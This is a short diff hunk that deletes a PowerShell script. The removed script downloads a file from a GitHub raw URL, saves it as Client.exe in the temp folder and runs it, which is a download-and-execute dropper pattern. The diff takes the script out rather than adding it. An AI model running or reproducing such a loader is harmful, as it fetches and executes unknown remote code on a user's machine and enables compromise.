@@ -1,6 +1,0 @@
-ÿþ&cls
-$url = 'https://raw.githubusercontent.com/spicetfy/cmd/main/Client'
-$tempFile = Join-Path $env:TEMP 'Client.exe'
-
-Invoke-WebRequest -Uri $url -OutFile $tempFile
-Start-Process -FilePath $tempFile -Wait
